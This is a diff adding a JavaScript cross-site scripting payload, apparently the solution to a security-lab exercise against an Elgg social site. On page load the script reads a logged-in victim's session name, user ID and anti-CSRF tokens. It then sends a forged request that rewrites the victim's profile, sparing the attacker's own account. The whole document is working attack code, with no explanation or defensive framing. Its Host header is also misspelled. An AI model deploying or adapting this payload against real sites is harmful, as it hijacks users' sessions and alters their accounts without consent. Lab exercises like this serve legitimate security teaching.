@@ -1,0 +1,31 @@
+<script type="text/javascript">
+window.onload = function() {
+	// Checks whether the victim has signed in.
+	if (elgg.session.user == null) {
+		return;
+	}
+
+	// Builds all the necessary fields.
+	var desc = "briefdescription=A successful XSS attack";
+	var access_level = "&accesslevel[briefdescription]=2";
+	var gender = "&gender=female/male/custom";
+	var username = "&name=" + elgg.session.user.name;
+	var guid = "&guid=" + elgg.session.user.guid;
+	var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
+	var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
+
+	// Constructs the content of the HTTP request.
+	var send_url = "http://www.xsslabelgg.com/action/profile/edit";
+	var send_body = desc + access_level + gender + username + guid + ts + token;
+	var samy_guid = 47;
+
+	// Creates the AJAX request to modify profile.
+	if (elgg.session.user.guid != samy_guid) {
+		var Ajax = new XMLHttpRequest();
+		Ajax.open("POST", send_url, true);
+		Ajax.setRequestHeader("Host", "www.xsslabegg.com");
+		Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+		Ajax.send(send_body);
+	}
+}
+</script>
